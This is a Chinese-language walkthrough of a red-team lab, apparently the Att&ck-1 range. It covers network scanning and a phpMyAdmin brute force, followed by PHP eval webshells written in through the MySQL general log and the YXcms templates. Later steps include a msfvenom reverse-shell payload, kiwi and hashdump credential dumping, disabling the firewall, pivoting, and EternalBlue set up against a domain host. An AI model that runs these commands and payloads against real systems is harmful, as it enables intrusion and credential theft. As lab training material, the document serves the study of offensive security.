# Att&ck-1

# 环境搭建

新添加一个段地址为：192.168.52.0/24

# Web渗透

## 存活扫描

### arp-scan

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:49:ab:d2, IPv4: 192.168.5.128
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.5.1     00:50:56:c0:00:08       VMware, Inc.
192.168.5.2     00:50:56:f8:00:0f       VMware, Inc.
192.168.5.129   00:0c:29:a7:c1:b2       VMware, Inc.
192.168.5.254   00:50:56:f8:a9:4a       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 1.985 seconds (128.97 hosts/sec). 4 responded
```

### nmap

- ping扫描

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# nmap -sP 192.168.5.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 06:48 EST
Nmap scan report for 192.168.5.1
Host is up (0.00063s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.5.2
Host is up (0.000091s latency).
MAC Address: 00:50:56:F8:00:0F (VMware)
Nmap scan report for 192.168.5.129
Host is up (0.000097s latency).
MAC Address: 00:0C:29:A7:C1:B2 (VMware)
Nmap scan report for 192.168.5.254
Host is up (0.000069s latency).
MAC Address: 00:50:56:F8:A9:4A (VMware)
Nmap scan report for 192.168.5.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.94 seconds
```

- arp扫描

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# nmap -sn -PR 192.168.5.0/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 06:50 EST
Nmap scan report for 192.168.5.1
Host is up (0.00013s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.5.2
Host is up (0.000065s latency).
MAC Address: 00:50:56:F8:00:0F (VMware)
Nmap scan report for 192.168.5.129
Host is up (0.00020s latency).
MAC Address: 00:0C:29:A7:C1:B2 (VMware)
Nmap scan report for 192.168.5.254
Host is up (0.00010s latency).
MAC Address: 00:50:56:F8:A9:4A (VMware)
Nmap scan report for 192.168.5.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.92 seconds
```

参数解释：

```csharp
-sn 不扫描端口，只扫描主机
-PR  ARP ping扫描
-sP        Ping扫描 sn
-P0        无Ping扫描
-PS        TCP SYN Ping扫描
-PA         TCP ACK Ping扫描
-PU         UDP ping扫描
-PE/PM/PP    ICMP Ping Types扫描
```

- 基于netbios的扫描

```csharp
nmap -sU --script nbstat.nse -p137 192.168.5.1/24 -T4
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled.png)

- 基于snmp扫描

```csharp
nmap -sU --script snmp-brute 192.168.5.0/24 -T4
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%201.png)

- 基于syn扫描

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# nmap -sS 192.168.5.0/24 -T4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 07:05 EST
Nmap scan report for 192.168.5.1
Host is up (0.00027s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
7000/tcp open  afs3-fileserver
8000/tcp open  http-alt
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.5.2
Host is up (0.00076s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 00:50:56:F8:00:0F (VMware)

Nmap scan report for 192.168.5.129
Host is up (0.00025s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:A7:C1:B2 (VMware)

Nmap scan report for 192.168.5.254
Host is up (0.00012s latency).
All 1000 scanned ports on 192.168.5.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:F8:A9:4A (VMware)

Nmap scan report for 192.168.5.128
Host is up (0.0000030s latency).
All 1000 scanned ports on 192.168.5.128 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (5 hosts up) scanned in 9.85 seconds
```

### msfconsole

- arp模块

```csharp
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(scanner/discovery/arp_sweep) > set rhosts 192.168.5.1/24
msf6 auxiliary(scanner/discovery/arp_sweep) > set threads 30
msf6 auxiliary(scanner/discovery/arp_sweep) > run
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%202.png)

- 基于netbios的扫描

```csharp
use auxiliary/scanner/netbios/nbname
```

- 基于snmp扫描

```csharp
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.5.1/24
run

#在msf中的速度有点慢，线程调大会扫不出来
```

### ping

- linux

```csharp
for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
```

- windows

```csharp
for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i "ttl="
```

如果对方服务器开启防火墙会禁ping，那么就会扫描不到

经过以上扫描得知目标服务器的地址为： 192.168.5.129

## 端口扫描

### nmap

- SYN扫描

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# nmap -sS -sV -O 192.168.5.129 -T4
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 07:25 EST
Nmap scan report for 192.168.5.129
Host is up (0.00041s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:A7:C1:B2 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|8|Vista|2008
OS CPE: cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1
OS details: Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.80 seconds
```

开放了80http服务和3306MySQL数据库服务，是一台windows主机 -O进行主机系统探测

- min-rate扫描

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# nmap --min-rate 10000 192.168.5.129 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 07:27 EST
Nmap scan report for 192.168.5.129
Host is up (0.00026s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:A7:C1:B2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

这种方法扫描速度很快，后面可以对这些开放的端口进行详细信息扫描，实战中如果发包很快会被对方服务器ban掉，可能扫描出来的结果也不是很准确

## 目录扫描

经过扫描得知开放了80端口，访问

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%203.png)

发现phpstudy的探针，由此可知该网站是使用PHPstudy来搭建的

还可以看到网站的绝对路径

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%204.png)

进行目录扫描

- dirb

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# dirb http://192.168.5.129/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 25 07:32:13 2023
URL_BASE: http://192.168.5.129/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.5.129/ ----
+ http://192.168.5.129/aux (CODE:403|SIZE:212)                                                       
+ http://192.168.5.129/com1 (CODE:403|SIZE:213)                                                      
+ http://192.168.5.129/com2 (CODE:403|SIZE:213)                                                      
+ http://192.168.5.129/com3 (CODE:403|SIZE:213)                                                      
+ http://192.168.5.129/con (CODE:403|SIZE:212)                                                       
+ http://192.168.5.129/lpt1 (CODE:403|SIZE:213)                                                      
+ http://192.168.5.129/lpt2 (CODE:403|SIZE:213)                                                      
+ http://192.168.5.129/nul (CODE:403|SIZE:212)                                                       
+ http://192.168.5.129/phpinfo.php (CODE:200|SIZE:71449)                                             
==> DIRECTORY: http://192.168.5.129/phpmyadmin/                                                      
==> DIRECTORY: http://192.168.5.129/phpMyAdmin/                                                      
+ http://192.168.5.129/prn (CODE:403|SIZE:212)
```

存在`phpinfo.php`和`phpMyAdmin`

- dirsearch

```csharp
python3 dirsearch.py -u http://192.168.5.129/
[20:36:09] 200 -   14KB - /l.php
[20:36:37] 200 -    2KB - /phpmyadmin/README
[20:36:37] 200 -   32KB - /phpmyadmin/ChangeLog
[20:36:38] 200 -   71KB - /phpinfo.php
[20:36:38] 301 -  240B  - /phpMyAdmin  ->  http://192.168.5.129/phpMyAdmin/
[20:36:38] 301 -  240B  - /phpmyadmin  ->  http://192.168.5.129/phpmyadmin/
[20:36:39] 200 -    4KB - /phpMyadmin/
[20:36:39] 200 -    4KB - /phpMyAdmin/
[20:36:39] 200 -    4KB - /phpmyAdmin/
[20:36:39] 200 -    4KB - /phpmyadmin/
[20:36:39] 200 -    4KB - /phpMyAdmin/index.php
[20:36:39] 200 -    4KB - /phpmyadmin/index.php
```

访问phpinfo.php查看

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%205.png)

是一个phpinfo页面

访问`phpMyAdmin`

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%206.png)

## phpMyAdmin-GetShell

使用phpMyAdmin弱口令爆破工具尝试爆破

• 下载地址：[https://pan.baidu.com/s/1n2mMkPCx4coNbyDlEdNlpg](https://pan.baidu.com/s/1n2mMkPCx4coNbyDlEdNlpg)  提取码：`nj4q`

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%207.png)

爆破成功得到账号和密码 root/root

使用账号密码登录

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%208.png)

### 版本信息获取

获取`phpmyadmin`版本信息，在网址根路径后面添加

```csharp
readme.php
README
changelog.php
Change
Documetation.html
Documetation.txt
translators.html
```

这个方法基本不会出错，除非管理员把这些都给删了

### 绝对路径获取

1、phpinfo页面

2、web报错信息

3、执行sql语句来查看，前提是使用phpstudy和wammp这类的软件搭建的，这样就可以根据mysql的位置来猜出www的目录地址

```csharp
show variables like '%datadir%';
```

4、利用seleet load_file来读取一些文件的内容，从中获取铭感信息，可以尝试/etc/passwd，apache|nginx|httpd log之类的文件

5、其他方法

```csharp
1.查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径
2.进入后台
3.百度出错信息 zoomeye shadon 搜索error warning
4. @@datadir参数看mysql路径 反猜绝对路径
```

### 写入文件getshell

因为我们是以root用户登录的，权限非常大，可以读取和写入一些文件，通过写文件来getshell需要满足几个条件

```csharp
1.数据库root权限
2.知道网站的物理路径
3.数据库有写权限
```

**直接写入文件getshell**

直接用`into outfile`直接在网站目录下写入webshell，但是该方法需要前提条件是：

```csharp
(1) 当前的数据库用户有写权限
(2) 知道web绝对路径
(3) web路径能写
```

如何判断当前数据库用户有写权限？

执行：

```csharp
show variables like '%secure%';
```

如果`secure_file_priv`如果非空，则只能在对应的目录下读文件，如果是空即可在其他目录写。Linux下默认/tmp目录可写。

```csharp
secure-file-priv特性
secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。
当secure_file_priv的值为null ，表示限制mysql 不允许导入|导出
当secure_file_priv的值为/tmp/ ，表示限制mysql 的导入|导出只能发生在/tmp/目录下
当secure_file_priv的值没有具体值时，表示不对mysql 的导入|导出做限制
可以在mysql-ini文件中设置其属性
```

直接利用phpmyadmin来执行sql语句查看

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%209.png)

绝对路径可以根据之前phpstudy的探针获取

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2010.png)

尝试写入

```csharp
select "<?php phpinfo();?>" INTO OUTFILE  "C:\\phpStudy\\WWW\\a.php"
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2011.png)

尝试用sql语句写文件，结果因为MySQL服务器使用`--secure file priv`选项运行，所以无法执行此语句；

**尝试通过写入日志文件getshell**

前提条件:

```csharp
读写权限+web绝对路径，修改日志文件为webshell
```

利用过程：

1、查看日志状态

```csharp
show variables like '%general%';
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2012.png)

日志状态是关闭的，开启后，所有执行过的sql语句都会保持在stu1.log文件里，我们可以修改保存的路径为我们指定的文件

2、开启日志记录

```csharp
set global general_log = "ON";
```

3、指定日志文件

```csharp
set global general_log_file = "C:/phpStudy/WWW/a.php";
```

4、写入执行代码

```csharp
select "<?php phpinfo();?>";
```

依次执行

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2013.png)

成功写入

5、写入一句话木马

```csharp
select "<?php eval($_POST[1]);?>";
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2014.png)

成功执行

蚁剑连接

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2015.png)

## YXcms-Getshell

官方简介中还介绍了这个cms来getshell

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2016.png)

在公告处提示了后台登录地址和账号密码

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2017.png)

访问，使用账号密码登录

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2018.png)

在前台模板处可以插入和新建webshell

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2019.png)

新建shell.php

```csharp
<?php eval($_POST[2]);?>
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2020.png)

访问

[http://192.168.5.129/yxcms/protected/apps/default/view/default/shell.php](http://192.168.5.129/yxcms/protected/apps/default/view/default/shell.php)

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2021.png)

蚁剑连接

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2022.png)

# 内网渗透

## 杀软识别

在线查杀

[http://payloads.net/kill_software/](http://payloads.net/kill_software/)

```csharp
tasklist /svc
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2023.png)

不存在杀软

## msf上线

生产木马

kali:

```csharp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe > shell.exe
```

```csharp
┌──(root㉿kali)-[~/Desktop]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

msf监听：

```csharp
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.5.128
run
```

利用蚁剑将shell.exe上传并执行

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2024.png)

成功反弹

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2025.png)

## 信息收集

**`ipconfig`**

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2026.png)

发现内网地址

```csharp
192.168.52.x
```

`**net config Workstation**`

查看当前计算机名称，全名，用户名，以及所在的工作站域等信息；

```csharp
C:\phpStudy\WWW> net config Workstation
计算机名                     \\STU1
计算机全名                   stu1.god.org
用户名                       Administrator
工作站正运行于               
    NetBT_Tcpip_{4DAEBDFD-0177-4691-8243-B73297E2F0FF} (000C29A7C1A8)
    NetBT_Tcpip_{55ECD929-FBB2-4D96-B43D-8FFEB14A169F} (000C29A7C1B2)
    NetBT_Tcpip_{EC57C4EB-763E-4000-9CDE-4D7FF15DF74C} (02004C4F4F50)
软件版本                     Windows 7 Professional
工作站域                     GOD
工作站域 DNS 名称            god.org
登录域                       GOD
COM 打开超时 (秒)            0
COM 发送计数 (字节)          16
COM 发送超时 (毫秒)          250
命令成功完成。
```

存在域：god.org

`**net localgroup administrators**`

查看本地管理员，发现还有另一台用户；

```csharp
C:\phpStudy\WWW> net localgroup administrators
别名     administrators
注释     管理员对计算机/域有不受限制的完全访问权
成员
-------------------------------------------------------------------------------
Administrator
GOD\Domain Admins
liukaifeng01
命令成功完成
```

**`systeminfo`** 查看系统信息

```csharp
C:\phpStudy\WWW> systeminfo
主机名:           STU1
OS 名称:          Microsoft Windows 7 专业版 
OS 版本:          6.1.7601 Service Pack 1 Build 7601
OS 制造商:        Microsoft Corporation
OS 配置:          成员工作站
OS 构件类型:      Multiprocessor Free
注册的所有人:     Windows 用户
注册的组织:       
产品 ID:          00371-177-0000061-85693
初始安装日期:     2019/8/25, 9:54:10
系统启动时间:     2023/2/25, 19:28:44
系统制造商:       VMware, Inc.
系统型号:         VMware Virtual Platform
系统类型:         x64-based PC
处理器:           安装了 1 个处理器。
                  [01]: Intel64 Family 6 Model 165 Stepping 5 GenuineIntel ~2808 Mhz
BIOS 版本:        Phoenix Technologies LTD 6.00, 2020/7/22
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     2,047 MB
可用的物理内存:   1,218 MB
虚拟内存: 最大值: 4,095 MB
虚拟内存: 可用:   3,145 MB
虚拟内存: 使用中: 950 MB
页面文件位置:     C:\pagefile.sys
域:               god.org
登录服务器:       \\OWA
修补程序:         安装了 4 个修补程序。
                  [01]: KB2534111
                  [02]: KB2999226
                  [03]: KB958488
                  [04]: KB976902
网卡:             安装了 5 个 NIC。
                  [01]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接
                      启用 DHCP:   否
                      IP 地址
                        [01]: 192.168.52.143
                  [02]: TAP-Windows Adapter V9
                      连接名:      本地连接 2
                      状态:        媒体连接已中断
                  [03]: Microsoft Loopback Adapter
                      连接名:      Npcap Loopback Adapter
                      启用 DHCP:   是
                      DHCP 服务器: 255.255.255.255
                      IP 地址
                        [01]: 169.254.129.186
                        [02]: fe80::b461:ccad:e30f:81ba
                  [04]: TAP-Windows Adapter V9
                      连接名:      本地连接 3
                      状态:        媒体连接已中断
                  [05]: Intel(R) PRO/1000 MT Network Connection
                      连接名:      本地连接 4
                      启用 DHCP:   是
                      DHCP 服务器: 192.168.5.254
                      IP 地址
                        [01]: 192.168.5.129
```

`**net time /domain**` 定位域控

```csharp
C:\phpStudy\WWW> net time /domain
\\owa.god.org 的当前时间是 2023/2/25 21:55:27
命令成功完成
```

确定域控IP地址

```csharp
C:\phpStudy\WWW> ping owa.god.org
正在 Ping owa.god.org [192.168.52.138] 具有 32 字节的数据:
来自 192.168.52.138 的回复: 字节=32 时间<1ms TTL=128
来自 192.168.52.138 的回复: 字节=32 时间<1ms TTL=128
来自 192.168.52.138 的回复: 字节=32 时间<1ms TTL=128
来自 192.168.52.138 的回复: 字节=32 时间<1ms TTL=128
192.168.52.138 的 Ping 统计信息:
    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，
往返行程的估计时间(以毫秒为单位):
    最短 = 0ms，最长 = 0ms，平均 = 0ms
```

`net group "Domain Admins" /domain` 查询域管理员

```csharp
C:\phpStudy\WWW> net group "Domain Admins" /domain
这项请求将在域 god.org 的域控制器处理。
组名     Domain Admins
注释     指定的域管理员
成员
-------------------------------------------------------------------------------
Administrator            OWA$                     
命令成功完成。
```

使用msf定位域控 `run post/windows/gather/enum_domain`

```csharp
meterpreter > run post/windows/gather/enum_domain

[+] Domain FQDN: god.org
[+] Domain NetBIOS Name: GOD
[+] Domain Controller: owa.god.org (IP: 192.168.52.138)
```

确定域控ip地址为：192.168.52.138

使用msf列出域内成员 `run post/windows/gather/enum_ad_computers`

```csharp
meterpreter > run post/windows/gather/enum_ad_computers 

Domain Computers
================

 dNSHostName         distinguishedName   description  operatingSystem         operatingSystemService
                                                                              Pack
 -----------         -----------------   -----------  ---------------         ----------------------
 owa.god.org         CN=OWA,OU=Domain C               Windows Server 2008 R2  Service Pack 1
                     ontrollers,DC=god,                Datacenter
                     DC=org
 root-tvi862ubeh.go  CN=ROOT-TVI862UBEH               Windows Server 2003
 d.org               ,CN=Computers,DC=g
                     od,DC=org
```

### 抓取密码

获取明文密码

```csharp
load kiwi
creds_all
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2027.png)

获取到域管理员的密码

获取hash  `hashdump`

```csharp
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

查看补丁信息：`run post/windows/gather/enum_patches`

```csharp
meterpreter > run post/windows/gather/enum_patches 

[*] Running module against STU1 (192.168.5.129)

Installed Patches
=================

  HotFix ID  Install Date
  ---------  ------------
  KB2534111  8/25/2019
  KB2999226  9/15/2019
  KB958488   8/29/2019
  KB976902   11/21/2010
```

信息收集常用命令：

```csharp
net time /domain        #查看时间服务器，判断主域，主域服务器都做时间服务器
net user /domain        #查看域用户
net view /domain        #查看有几个域
ipconfig /all 　　　　　  #查询本机IP段，所在域等 
net config Workstation  #当前计算机名，全名，用户名，系统版本，工作站域，登陆域 
net user 　　　　　　　   #本机用户列表
net group "domain computers" /domain   #查看域内所有的主机名 
net group "domain admins" /domain      #查看域管理员 
net group "domain controllers" /domain #查看域控
net localhroup administrators          #本机管理员[通常含有域用户]
net user 用户名 /domain                 #获取指定用户的账户信息  
net group /domain                      #查询域里面的工作组 
net group 组名 /domain                  #查询域中的某工作组
```

## 权限提升

这里是administrator权限，可以使用getsystem尝试提权

```csharp
meterpreter > getuid
Server username: GOD\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

成功提权

连接远程桌面

使用msf开启

```csharp
meterpreter > run post/windows/manage/enable_rdp
```

连接

```csharp
rdesktop 192.168.5.129
```

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2028.png)

还可以自己创建一个用户，将用户加入管理员组进行远程登录

如果出现连接失败，可能是防火墙原因

```csharp
netsh advfirewall set allprofiles state off 关闭防火墙

netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow 防火墙放行3389
```

## 添加路由

经过信息收集可以知道的有 该主机是一个域环境并且知道了他的内网地址，还有域控的ip地址，该主机并无杀软意味着我们可以随意操作不会被杀软拦截

开始添加路由，渗透内网网段

```csharp
meterpreter > run get_local_subnets //查看路由段

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 169.254.0.0/255.255.0.0
Local subnet: 192.168.5.0/255.255.255.0
Local subnet: 192.168.52.0/255.255.255.0
meterpreter > run autoroute -p //查看路由

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] No routes have been added yet
meterpreter > run autoroute -s 192.168.52.0/24 //添加路由

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.52.0/255.255.255.0...
[+] Added route to 192.168.52.0/255.255.255.0 via 192.168.5.129
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.52.0       255.255.255.0      Session 2

meterpreter >
```

还可以利用msf自动创建路由

```csharp
meterpreter > run post/multi/manage/autoroute 

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against STU1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 192.168.5.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.52.0/255.255.255.0 from host's routing table.
```

## 内网主机存活扫描

### arp

- arp -a 查看路由表

```csharp
meterpreter > arp -a

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    169.254.255.255  ff:ff:ff:ff:ff:ff  24
    192.168.5.1      00:50:56:c0:00:08  25
    192.168.5.2      00:50:56:f8:00:0f  25
    192.168.5.128    00:0c:29:49:ab:d2  25
    192.168.5.254    00:50:56:f8:a9:4a  25
    192.168.5.255    ff:ff:ff:ff:ff:ff  25
    192.168.52.138   00:0c:29:3f:5d:a9  11
    192.168.52.141   00:0c:29:6d:39:34  11
    192.168.52.255   ff:ff:ff:ff:ff:ff  11
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  24
    224.0.0.22       01:00:5e:00:00:16  11
    224.0.0.22       01:00:5e:00:00:16  22
    224.0.0.22       01:00:5e:00:00:16  23
    224.0.0.22       01:00:5e:00:00:16  25
    224.0.0.252      01:00:5e:00:00:fc  24
    224.0.0.252      01:00:5e:00:00:fc  11
    224.0.0.252      01:00:5e:00:00:fc  25
    255.255.255.255  ff:ff:ff:ff:ff:ff  24
    255.255.255.255  ff:ff:ff:ff:ff:ff  22
    255.255.255.255  ff:ff:ff:ff:ff:ff  23
    255.255.255.255  ff:ff:ff:ff:ff:ff  25
```

- msf `auxiliary/scanner/discovery/arp_sweep` 模块

```csharp
use auxiliary/scanner/discovery/arp_sweep
set rhost 192.168.52.1/24
run
```

### portscan

```csharp
use auxiliary/scanner/portscan/tcp
set rhost 192.168.52.1/24
set ports 80 135 445 3389 8080 21
set threads 100
run
```

执行结果：

```csharp
msf6 auxiliary(scanner/portscan/tcp) > run

[*] 192.168.52.1/24:      - Scanned  52 of 256 hosts (20% complete)
[*] 192.168.52.1/24:      - Scanned  54 of 256 hosts (21% complete)
[*] 192.168.52.1/24:      - Scanned  80 of 256 hosts (31% complete)
[+] 192.168.52.143:       - 192.168.52.143:80 - TCP OPEN
[+] 192.168.52.138:       - 192.168.52.138:80 - TCP OPEN
[*] 192.168.52.1/24:      - Scanned 103 of 256 hosts (40% complete)
[*] 192.168.52.1/24:      - Scanned 150 of 256 hosts (58% complete)
[*] 192.168.52.1/24:      - Scanned 170 of 256 hosts (66% complete)
[*] 192.168.52.1/24:      - Scanned 182 of 256 hosts (71% complete)
[*] 192.168.52.1/24:      - Scanned 205 of 256 hosts (80% complete)
[*] 192.168.52.1/24:      - Scanned 240 of 256 hosts (93% complete)
[*] 192.168.52.1/24:      - Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

192.168.52.143是windows7的内网地址 192.168.52.138是域控地址

## 设置socks代理

刚才在msf中创建的路由只能在msf中使用，我们的工具是无法使用，现在搭建一条socks路由可以让我们的工具也能使用

```csharp
use auxiliary/server/socks_proxy
run
```

编辑 `vim /etc/proxychains4.conf`

```csharp
socks5 127.0.0.1 1080
```

### **使用代理nmap扫描内网存活主机**

先测试代理是否成功

```csharp
proxychains curl http://192.168.52.143
```

192.168.52.143是win7的内网地址，能访问这个肯定就能访问它的内网机器

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2029.png)

代理成功

经过以上存货扫描得知，内网存在两台主机分别是`192.168.52.138`是域控地址 `192.168.52.141`域成员地址

## 端口扫描

确定内网主机地址后，开始进行端口扫描

由于win7上自带nmap，这里为了方便使用一下，实战中还是要挂代理使用工具利用

![Untitled](Att&ck-1%20e6cdaf0ecee347919ad5d9d090eddf75/Untitled%2030.png)

可以看到两台主机都开了135、445端口，说明都有SMB服务；

## 攻击域成员

使用`auxiliary/scanner/smb/smb_version`扫描系统版本，是Windows2003版本；

```csharp
use auxiliary/scanner/smb/smb_version
set rhost 192.168.52.141
run
```

执行结果：

```csharp
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.52.141:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)Windows 2003 (build:3790) (name:ROOT-TVI862UBEH) (domain:GOD)
[+] 192.168.52.141:445    -   Host is running SMB Detected (versions:1) (preferred dialect:) (signatures:optional)Windows 2003 (build:3790) (name:ROOT-TVI862UBEH) (domain:GOD)
[*] 192.168.52.141:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

尝试使用永恒之蓝攻击

```csharp
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set rhost 192.168.52.141
set lport 5555
```

